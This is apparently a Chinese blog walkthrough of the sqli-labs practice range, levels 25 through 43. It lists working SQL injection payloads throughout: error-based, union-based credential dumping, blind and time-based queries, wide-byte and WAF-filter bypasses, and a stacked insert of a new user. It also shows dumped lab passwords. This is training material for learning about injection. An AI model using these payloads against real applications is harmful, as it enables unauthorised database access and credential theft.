<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># true</span></span><br><span class="line"></span><br><span class="line">// 因为是万能密码，为 true</span><br><span class="line"></span><br><span class="line"><span class="section">## login_user=admin&amp;login_password=a'+or+1=1--+-&amp;mysubmit=Login</span></span><br><span class="line"></span><br><span class="line">【true】页面 302 跳转</span><br><span class="line"></span><br><span class="line"><span class="section">## login_user=admin&amp;login_password=a'+or+1=0--+-&amp;mysubmit=Login</span></span><br><span class="line"></span><br><span class="line">【false】状态码 200</span><br></pre></td></tr></table></figure>

<h1 id="Less-43-Stacked-Query"><a href="#Less-43-Stacked-Query" class="headerlink" title="Less-43 - Stacked Query"></a>Less-43 - Stacked Query</h1><p>单引号报错，且注释符被 ban 了<br>依然采用报错注入</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_password=1'+||+extractvalue(0x20,concat(0x7c,version(),0x7c))+or'</span><br></pre></td></tr></table></figure>

<h1 id="Less-42-Stacked-Query-error-based"><a href="#Less-42-Stacked-Query-error-based" class="headerlink" title="Less-42 - Stacked Query error based"></a>Less-42 - Stacked Query error based</h1><p>登录失败会提示<code>bug off hacker</code>，真是祖安程序员呢<br>报错注入</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_password=1' and extractvalue(0x20,concat(0x7c,version(),0x7c)) -- -</span><br></pre></td></tr></table></figure>

<p>堆叠注入<br>略。不想构造 exp 了…<br>盲注（布尔 + 延时）</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc</span></span><br><span class="line"></span><br><span class="line">login_password=2'+order+by+3--+-;</span><br><span class="line"></span><br><span class="line"><span class="section"># exp</span></span><br><span class="line"></span><br><span class="line">login_password=0'+union select 1,2,3 from (select sleep(1))x;--+-</span><br></pre></td></tr></table></figure>

<h1 id="Less-41-stacked-Query-Intiger-type-blind"><a href="#Less-41-stacked-Query-Intiger-type-blind" class="headerlink" title="Less-41 stacked Query Intiger type blind"></a>Less-41 <strong>stacked Query Intiger type blind</strong></h1><p>闭合<code>/Less-41/?id=1 -- -</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># union based</span></span><br><span class="line"></span><br><span class="line">/Less-41/?id=0 union select 1,2,3</span><br><span class="line"></span><br><span class="line"><span class="section"># blind</span></span><br><span class="line"></span><br><span class="line">/Less-41/?id=1 ^ 5</span><br><span class="line"></span><br><span class="line"><span class="section">## POC:null</span></span><br><span class="line"></span><br><span class="line">/Less-41/?id=1 and if(1=1,0,1)</span><br><span class="line"></span><br><span class="line"><span class="section">## POC:true</span></span><br><span class="line"></span><br><span class="line">/Less-41/?id=1 and if(1=1,1,1)</span><br></pre></td></tr></table></figure>

<h1 id="Less-40-stacked-Query-String-type-Blind"><a href="#Less-40-stacked-Query-String-type-Blind" class="headerlink" title="Less-40 stacked Query String type Blind"></a>Less-40 <strong>stacked Query String type Blind</strong></h1><p>用<code>/Less-40/?id=1&#39;) -- -</code>确定闭合符号为<code>&#39;)</code><br>无回显的布尔盲注<br>UNION BASED，联合注入阿又给忘了。。</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># POC</span></span><br><span class="line"></span><br><span class="line">/Less-40/?id=0') union ALL select 1,22,('33</span><br><span class="line">或者</span><br><span class="line">/Less-40/?id=0') union select 1,22,3 -- -</span><br><span class="line"></span><br><span class="line"><span class="section"># sqlmap poc</span></span><br><span class="line"></span><br><span class="line">id=-7067') UNION ALL SELECT NULL,CONCAT(0x7178627671,0x6b7375687a726b446c4746706e6b4f585273466b7655614d51667851434e7a55666e5671615a794d,0x71626a7671),NULL-- -</span><br></pre></td></tr></table></figure>

<h1 id="Less-39-stacked-Query-Intiger-type"><a href="#Less-39-stacked-Query-Intiger-type" class="headerlink" title="Less-39 stacked Query Intiger type"></a>Less-39 <strong>stacked Query Intiger type</strong></h1><p>报错注</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-39/?id=1 and extractvalue(0x20,concat(0x7c,version(),0x7c))-- -</span><br></pre></td></tr></table></figure>

<p>Union base injection</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-39/?id=0 union select 11,22,33</span><br></pre></td></tr></table></figure>

<p>delay injection(boolean)</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-39/?id=0 union select 1,2,1 from (select sleep(5))x;</span><br></pre></td></tr></table></figure>

<h1 id="Less-38-stacked-Query"><a href="#Less-38-stacked-Query" class="headerlink" title="Less-38 stacked Query"></a>Less-38 <strong>stacked Query</strong></h1><p>堆叠注入<br>报错注</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-38/?id=1' and extractvalue(rand(),concat(0x7c,version(),0x7c))-- -</span><br></pre></td></tr></table></figure>

<p>联合注</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-38/?id=0' union select 1,group<span class="emphasis">_concat(username),group_</span>concat(password) from users -- -</span><br></pre></td></tr></table></figure>

<p>插入用户</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-38/?id=1;insert into users(username,password) values('stack', 'stack')%23</span><br></pre></td></tr></table></figure>

<h1 id="Less-37-MySQL-real-escape-string"><a href="#Less-37-MySQL-real-escape-string" class="headerlink" title="Less-37- MySQL_real_escape_string"></a>Less-37- MySQL_real_escape_string</h1><p>同样的报错注入，只不过是在<code>POST</code>请求里面</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">uname=admin+%df%27or+%27%27%3D%27&amp;passwd=111&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<h1 id="Less-36-Bypass-MySQL-Real-Escape-String"><a href="#Less-36-Bypass-MySQL-Real-Escape-String" class="headerlink" title="Less-36 Bypass MySQL Real Escape String"></a>Less-36 <strong>Bypass MySQL Real Escape String</strong></h1><p>宽字节，<code>%df%27</code>即可当单引号使用</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 报错注入</span></span><br><span class="line"></span><br><span class="line">/Less-36/?id=1%df%27%20and%20extractvalue(rand(),concat(0x7c,version(),0x7c))--%20-</span><br></pre></td></tr></table></figure>

<h1 id="Less-35-why-care-for-addslashes"><a href="#Less-35-why-care-for-addslashes" class="headerlink" title="Less-35 why care for addslashes()"></a>Less-35 <strong>why care for addslashes()</strong></h1><p>整数型注入点<br>盲注</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-35/?id=1 and 1=1</span></span><br><span class="line"></span><br><span class="line">有结果</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-35/?id=1 and 1=2</span></span><br><span class="line"></span><br><span class="line">无结果</span><br></pre></td></tr></table></figure>

<p>联合注入</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-35/?id=1 order by 3-- -</span></span><br><span class="line"></span><br><span class="line">有结果</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-35/?id=1 order by 4-- -</span></span><br><span class="line"></span><br><span class="line">Unknown column '4' in 'order clause'</span><br></pre></td></tr></table></figure>

<p>报错注入</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-35/?id=1 and extractvalue(rand(),concat(0x7c,version(),0x7c))</span><br></pre></td></tr></table></figure>

<h1 id="Less-34-Bypass-Add-SLASHES"><a href="#Less-34-Bypass-Add-SLASHES" class="headerlink" title="Less-34- Bypass Add SLASHES"></a>Less-34- Bypass Add SLASHES</h1><p>fuzz 大法好，burp 的<code>battering ram</code>, payload 选<code>brute forcer</code>的<code>0123456789</code>，就是<code>00-99</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1593017382227-985b4647-cc96-45e1-9531-16ce92ae90e6.png#align=left&display=inline&height=489&margin=%5Bobject%20Object%5D&name=l32-addS-fuzzing.png&originHeight=978&originWidth=1235&size=110376&status=done&style=none&width=618" alt="l32-addS-fuzzing.png"><br>最后得出可用的值，此处以<code>%99</code>为例（<code>%df</code>也可）</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># POST poc</span></span><br><span class="line"></span><br><span class="line"><span class="section">## uname=admin%99%27and+extractvalue(rand(),concat(0x7c,version(),0x7c))--+-&amp;passwd=admin%99%27&amp;submit=Submit</span></span><br><span class="line"></span><br><span class="line"><span class="code">    XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|'</span></span><br></pre></td></tr></table></figure>

<p>实际上，fuzz 可以从 00 一直到 ff<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1593017824176-21af679a-2032-4dd3-9905-63fffa028fa0.png#align=left&display=inline&height=909&margin=%5Bobject%20Object%5D&name=fuzz2.png&originHeight=909&originWidth=1638&size=160546&status=done&style=none&width=1638" alt="fuzz2.png"></p>
<h1 id="Less-33-不知何种原因，靶场环境和-32-一样"><a href="#Less-33-不知何种原因，靶场环境和-32-一样" class="headerlink" title="Less-33 不知何种原因，靶场环境和 32 一样"></a>Less-33 不知何种原因，靶场环境和 32 一样</h1><p>略过</p>
<h1 id="Less-32-Bypass-addslashes"><a href="#Less-32-Bypass-addslashes" class="headerlink" title="Less-32 Bypass addslashes()"></a>Less-32 <strong>Bypass addslashes()</strong></h1><p>宽字节注入, 用<code>%df</code>吞以下<code>addslashes()</code>加上的反斜杠<code>\</code>，即可报错注入</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-32/?id=1%df' and extractvalue(0x20,concat(0x7c,version(),0x7c))-- -</span><br></pre></td></tr></table></figure>

<p>当然，只要能够逃逸出单引号，就可以盲注</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 盲注 poc</span></span><br><span class="line"></span><br><span class="line">/Less-32/?id=1%df'and 1=0 -- -</span><br></pre></td></tr></table></figure>

<p>同时，有回显的情况下，UNION 注入也可</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># order by 定列数</span></span><br><span class="line"></span><br><span class="line"><span class="section">## /Less-32/?id=1%df%27%20order%20by%204%20--%20-</span></span><br><span class="line"></span><br><span class="line">Unknown column '4' in 'order clause'</span><br><span class="line"></span><br><span class="line"><span class="section">## /Less-32/?id=1%df%27%20order%20by%204%20--%20-</span></span><br><span class="line"></span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>

<p><a href="https://sec4ever.cn/Less-18/" target="_blank" rel="noopener">https://sec4ever.cn/Less-18/</a></p>
<h1 id="Less-31-FUN-with-WAF"><a href="#Less-31-FUN-with-WAF" class="headerlink" title="Less-31 FUN with WAF"></a>Less-31 FUN with WAF</h1><p>加双引号报错，注释<code>-- -</code>未过滤</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">猜列名</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-31/?id=1") order by 3-- -</span></span><br><span class="line"></span><br><span class="line">(正常结果)</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-31/?id=1") order by 4 -- -</span></span><br><span class="line"></span><br><span class="line">（报错）</span><br><span class="line">Unknown column '4' in 'order clause'</span><br></pre></td></tr></table></figure>

<p>只是闭合符号跟上关不同，这里的闭合符号是<code>&quot;)</code>，最终采用联合注入+group_concat 的方式，一次性取出所有数据。</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-31/?id=0")%20 unIOn seLEct 1,group<span class="emphasis">_concat(username),group_</span>concat(password) from users -- -</span><br></pre></td></tr></table></figure>

<p>报错注入也是可以的，此处就不贴出<code>payload</code>了</p>
<h1 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h1><p>这关也是 waf，结果引号、<code>order by</code>、<code>union select</code>、注释均可使用，这个 waf 属实捞</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc</span></span><br><span class="line"></span><br><span class="line">/Less-30/?id=0" unIOn seLEct 1,2,3 -- -</span><br><span class="line"></span><br><span class="line"><span class="section"># union based sqli</span></span><br><span class="line"></span><br><span class="line">/Less-30/?id=0" unIOn seLEct 1,group<span class="emphasis">_concat(username),group_</span>concat(password) from users -- -</span><br></pre></td></tr></table></figure>

<h1 id="Less-29-Protection-with-WAF"><a href="#Less-29-Protection-with-WAF" class="headerlink" title="Less-29 Protection with WAF"></a>Less-29 Protection with WAF</h1><p>说好的 waf 呢？<br>——既没有过滤引号，也没有过滤<code>and</code> <code>or</code><br>报错注入，直接冲了</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-29/?id=0' or extractvalue(0x20,concat(0x7c,version(),0x7c))-- -</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|'</span><br></pre></td></tr></table></figure>

<p>UNION 联合注</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 表名</span></span><br><span class="line"></span><br><span class="line">/Less-29/?id=0' union select 1,group<span class="emphasis">_concat(table_</span>name,0x20) ,group<span class="emphasis">_concat(table_</span>schema,0x20) from information_schema.tables where '1</span><br><span class="line"></span><br><span class="line"><span class="section"># 数据</span></span><br><span class="line"></span><br><span class="line">/Less-29/?id=0' union select 1,group<span class="emphasis">_concat(username,0x20) ,group_</span>concat(password,0x20) from users where '1</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592746584181-b75630ad-ba36-4716-a8fe-2cd7e17d5b60.png#align=left&display=inline&height=883&margin=%5Bobject%20Object%5D&name=l29.png&originHeight=883&originWidth=1869&size=575824&status=done&style=none&width=1869" alt="l29.png"></p>
<h1 id="Less-28a-Trick-with-SELECT-amp-UNION"><a href="#Less-28a-Trick-with-SELECT-amp-UNION" class="headerlink" title="Less-28a Trick with SELECT &amp; UNION"></a>Less-28a Trick with SELECT &amp; UNION</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 闭合</span></span><br><span class="line"></span><br><span class="line">/Less-28a/?id=1') -- -</span><br><span class="line"></span><br><span class="line"><span class="section"># 列数</span></span><br><span class="line"></span><br><span class="line">/Less-28a/?id=1')%20 order by 4 -- -</span><br><span class="line"></span><br><span class="line"><span class="section"># 出数据</span></span><br><span class="line"></span><br><span class="line">/Less-28a/?id=0') Union SELEct 1,2,3 -- -</span><br></pre></td></tr></table></figure>

<h1 id="Less-28-Trick-with-SELECT-amp-UNION"><a href="#Less-28-Trick-with-SELECT-amp-UNION" class="headerlink" title="Less-28 Trick with SELECT &amp; UNION"></a>Less-28 Trick with SELECT &amp; UNION</h1><p>找闭合符号的时候出了一些问题：<code>/Less-28/?id=0&#39;</code>无结果, 发现过滤空格和注释<br>应该想到闭合符号是<code>&#39;)</code>，用逻辑或来闭合<code>1&#39;)||(&#39;</code><br>空格用<code>%09</code>和<code>%a0</code>来绕过，因为过滤 union+select 的正则表达式是<code>preg_replace(&#39;/union\s+select/i&#39;,&quot;&quot;, $id);</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc 闭合</span></span><br><span class="line"></span><br><span class="line">/Less-28/?id=1')%09UNion%a0Select%091,2,('N</span><br><span class="line"></span><br><span class="line"><span class="section"># 出数据 poc</span></span><br><span class="line"></span><br><span class="line">/Less-28/?id=0')%09UNion%a0Select%091,version(),('3</span><br><span class="line">Your Login name:5.7.30-0ubuntu0.18.04.1</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<h1 id="Less-27a-Trick-with-SELECT-amp-UNION"><a href="#Less-27a-Trick-with-SELECT-amp-UNION" class="headerlink" title="Less-27a Trick with SELECT &amp; UNION"></a>Less-27a Trick with SELECT &amp; UNION</h1><p><strong>union based injection</strong></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-27a/?id=0"uNIon%A0seleCt%A01,2,"3</span><br></pre></td></tr></table></figure>

<p><strong>blooean injection</strong></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-27a/?id=1" and"1"="1</span></span><br><span class="line"></span><br><span class="line">1</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-27a/?id=1" and"1"="0</span></span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<h1 id="Less-27-Trick-with-SELECT-amp-UNION"><a href="#Less-27-Trick-with-SELECT-amp-UNION" class="headerlink" title="Less-27 Trick with SELECT &amp; UNION"></a>Less-27 Trick with SELECT &amp; UNION</h1><p>过滤了<code>SELECT、UNION</code>，但是采用报错注入完全可行</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># id=1'or(extractvalue(1,concat(0x5c, (VERSION()),'~')))='1'and'1a</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: '\5.7.30-0ubuntu0.18.04.1~'</span><br></pre></td></tr></table></figure>

<p>试着用<code>UNION</code>联合注入，需要 bypass<strong>空格及注释的过滤，</strong>采用大小写绕过关键字过滤，<code>%a0</code>绕过空格过滤<br><strong>猜列数</strong></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 3 列时，正常显示</span></span><br><span class="line"></span><br><span class="line"><span class="section">## /Less-27/?id=0'uNIon%A0selECt%A01,2,'3</span></span><br><span class="line"></span><br><span class="line"><span class="code">     Hint: Your Input is Filtered with following result: 0'uNIon�selECt�1,2,'3</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 4 列时，报错</span></span><br><span class="line"></span><br><span class="line"><span class="section">## /Less-27/?id=0'uNIon%A0selECt%A01,2,3,'N</span></span><br><span class="line"></span><br><span class="line">The used SELECT statements have a different number of columns</span><br><span class="line">Hint: Your Input is Filtered with following result: 0'uNIon�selECt�1,version(),'3</span><br></pre></td></tr></table></figure>

<p><strong>联合注入</strong></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 关键词大小写 + %a0 + where 闭合单引号 + group_concat 带出所有数据</span></span><br><span class="line"></span><br><span class="line"><span class="section">## /Less-27/?id=0%27uNIon%A0selECt%A01,group_concat(username),group_concat(password)%a0from%a0users%a0where%a0%271%27^%270</span></span><br><span class="line"></span><br><span class="line">Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span><br><span class="line">Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br></pre></td></tr></table></figure>

<p>ref</p>
<ul>
<li><a href="https://www.cnblogs.com/-qing-/p/11610385.html#_lab2_0_16" target="_blank" rel="noopener">SQL 注入靶场 sqli-labs 1-65 关全部通关教程 - 卿先生 - 博客园</a></li>
<li><a href="https://www.jianshu.com/p/48a935b123ce" target="_blank" rel="noopener">注入绕过技巧</a></li>
</ul>
<h1 id="Less-26a-Trick-with-comments"><a href="#Less-26a-Trick-with-comments" class="headerlink" title="Less-26a Trick with comments"></a>Less-26a Trick with comments</h1><p>盲注</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># /Less-26a/?id=0' || '0</span></span><br><span class="line"></span><br><span class="line">无结果</span><br><span class="line"></span><br><span class="line"><span class="section"># /Less-26a/?id=0' || '1</span></span><br><span class="line"></span><br><span class="line">有结果</span><br></pre></td></tr></table></figure>

<h1 id="Less-26-Trick-with-comments"><a href="#Less-26-Trick-with-comments" class="headerlink" title="Less-26 Trick with comments"></a>Less-26 Trick with comments</h1><p>过滤了空格、注释、<code>and</code>和<code>or</code>的处理</p>
<ol>
<li><strong>空格、注释被过滤的绕过：</strong>用<code>%a0</code>（测试失败。。。），也可以使用括号<code>()</code>，例如<code>id=1&#39;and(&#39;b&#39;)=(&#39;b&#39;)and&#39;1</code>。在要使用空格的场合（如<code>and</code>后面遇到字母）。需要注意的是：逻辑运算符不能被括号包裹</li>
<li><strong>and、or 被过滤的绕过</strong>：双写，即<code>AandND oorr</code>；或用其它双目运算符，如<code>&amp;&amp; || | ^ &gt; &lt;</code> 等</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592619793391-8b3b86d7-92f9-46e3-bd08-7d45ecf50d27.png#align=left&display=inline&height=423&margin=%5Bobject%20Object%5D&name=double_and.png&originHeight=846&originWidth=1136&size=446235&status=done&style=none&width=568" alt="double_and.png"></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-26/?id=1'oorr(extractvalue(1,concat(0x5c, (VERSION()),'~')))='1'anandd'1a</span><br></pre></td></tr></table></figure>

<h1 id="Less-25a-Trick-with-OR-amp-AND-Blind"><a href="#Less-25a-Trick-with-OR-amp-AND-Blind" class="headerlink" title="Less-25a Trick with OR &amp; AND Blind"></a>Less-25a Trick with OR &amp; AND Blind</h1><p>数字型的盲注，过滤了<code>and</code>和<code>or</code>，可用<code>anandd</code> <code>oorr</code>双写绕过</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># poc</span></span><br><span class="line"></span><br><span class="line">/Less-25a/?id=1 anandd if(lengh(version())=23,sleep(5),1)</span><br><span class="line">（爆破）确定长度为 23</span><br><span class="line"></span><br><span class="line"><span class="section"># 简单 exp, 出结果</span></span><br><span class="line"></span><br><span class="line">/Less-25a/?id=1+anandd+if('a'=substring(version(),1,1),1,0)</span><br></pre></td></tr></table></figure>

<p>利用<code>1 and [CASE]</code>中，<code>[CASE]</code>为真、假时，回显的不同来跑盲注<br>用 burp 的 intruder 来操作，配置如图<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592799238921-29e647c8-d269-4770-909d-8777b2eb895e.png#align=left&display=inline&height=129&margin=%5Bobject%20Object%5D&name=p1.png&originHeight=517&originWidth=832&size=52704&status=done&style=none&width=208" alt="p1.png">)<img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592799257427-4b232c18-94ac-42b9-a502-792d2a52b98d.png#align=left&display=inline&height=215&margin=%5Bobject%20Object%5D&name=p2.png&originHeight=858&originWidth=708&size=65932&status=done&style=none&width=177" alt="p2.png"></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 用于 fuzz 的 payload</span></span><br><span class="line"></span><br><span class="line">0123456789.-\_qwertyuiopasdfghjklzxcvbnm</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592799297552-8f1c18ec-f0a7-4946-bc6c-fb7d72421413.png#align=left&display=inline&height=349&margin=%5Bobject%20Object%5D&name=cb_intruder.png&originHeight=349&originWidth=1886&size=58892&status=done&style=none&width=1886" alt="cb_intruder.png"><br>最后指定关键字即可，<br>结果是一位一位出来的，如图<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592799419550-d301cc6b-ec91-4d4e-bdfd-477bd0d2529c.png#align=left&display=inline&height=1031&margin=%5Bobject%20Object%5D&name=res.png&originHeight=1031&originWidth=1206&size=102576&status=done&style=none&width=1206" alt="res.png"><br>但这种方法的时间复杂度太高了，可以利用二分法来降低至<code>O(log``_n_``)</code>, 因为 2^8=128，可以涵盖完所有的 ASCII 码，即比较八次即可确定一位数据。我会在后面给出盲注二分法的脚本。</p>
<h1 id="Less-25-Trick-with-OR-amp-AND"><a href="#Less-25-Trick-with-OR-amp-AND" class="headerlink" title="Less-25 Trick with OR &amp; AND"></a>Less-25 Trick with OR &amp; AND</h1><p>过滤了<code>or</code>跟<code>and</code>，绕过倒是好绕过，双目运算符都行，例如<code>|| &amp;&amp;</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1' ^ extractvalue(0x20,concat(0x7c,user(),0x7c)) ^'</span><br></pre></td></tr></table></figure>

<p>不过由于 or 不能用，所以没法用<code>inf``**or**``mation_schema</code>来获得表名和列名。<br>想用 16 进制，发现【不能绕过】，长姿势了<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592577166667-b4df2a13-8b23-45f0-9760-cf3702c0bff7.png#align=left&display=inline&height=154&margin=%5Bobject%20Object%5D&name=image.png&originHeight=308&originWidth=1175&size=24086&status=done&style=none&width=587.5" alt="image.png"><br>下面介绍不用 information_schema 也能得到表名、列名的方式</p>
<ol>
<li>先得到版本，</li>
</ol>
